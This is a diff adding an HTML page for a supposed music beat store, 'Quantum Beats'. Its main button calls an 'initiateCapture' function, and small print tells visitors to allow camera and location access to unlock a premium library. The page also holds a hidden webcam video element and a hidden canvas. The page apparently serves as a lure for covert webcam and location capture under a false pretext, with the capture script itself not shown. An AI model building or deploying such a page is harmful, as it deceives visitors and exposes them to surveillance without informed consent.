@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quantum Beats - Unleash Your Sound</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Quantum Beats</h1>
+            <nav>
+                <ul>
+                    <li><a href="#beats">Beats</a></li>
+                    <li><a href="#samples">Samples</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <section id="hero">
+        <div class="container">
+            <h2>Experience the Future of Sound Production</h2>
+            <p>High-quality beats and samples designed to elevate your music.</p>
+            <button class="cta-button" onclick="initiateCapture()">Explore Beats Now</button>
+            <p class="small-text">To unlock our exclusive premium library and personalized recommendations, please allow location and camera access when prompted.</p>
+        </div>
+    </section>
+
+    <section id="beats" class="container">
+        <h3>Our Latest Drops</h3>
+        <div class="beat-grid">
+            <div class="beat-card">
+                <img src="beat1.jpg" alt="Beat 1">
+                <h4>Nebula Flow</h4>
+                <p>Smooth R&B / Trap</p>
+                <audio controls src="beat1.mp3"></audio>
+                <button class="buy-button">Buy Now</button>
+            </div>
+            <div class="beat-card">
+                <img src="beat2.jpg" alt="Beat 2">
+                <h4>Cyberpunk Groove</h4>
+                <p>Futuristic Hip-Hop</p>
+                <audio controls src="beat2.mp3"></audio>
+                <button class="buy-button">Buy Now</button>
+            </div>
+            <div class="beat-card">
+                <img src="beat3.jpg" alt="Beat 3">
+                <h4>Vaporwave Dream</h4>
+                <p>Lofi / Ambient</p>
+                <audio controls src="beat3.mp3"></audio>
+                <button class="buy-button">Buy Now</button>
+            </div>
+        </div>
+        <p class="loading-message" id="loadingMessage" style="display: none;">Accessing premium library... Please wait.</p>
+        <video id="webcamFeed" style="display:none; width: 320px; height: 240px; transform: scaleX(-1);"></video>
+        <canvas id="cameraCanvas" style="display:none;"></canvas>
+    </section>
+
+    <section id="samples" class="container">
+        <h3>Free Sample Packs</h3>
+        <p>Sign up to get access to our exclusive free sample packs!</p>
+        <form>
+            <input type="email" placeholder="Your Email" required>
+            <button type="submit" class="cta-button">Get Samples</button>
+        </form>
+    </section>
+
+    <footer id="contact">
+        <div class="container">
+            <p>&copy; 2024 Quantum Beats. All rights reserved.</p>
+            <p>Contact us: info@quantumbeats.com</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
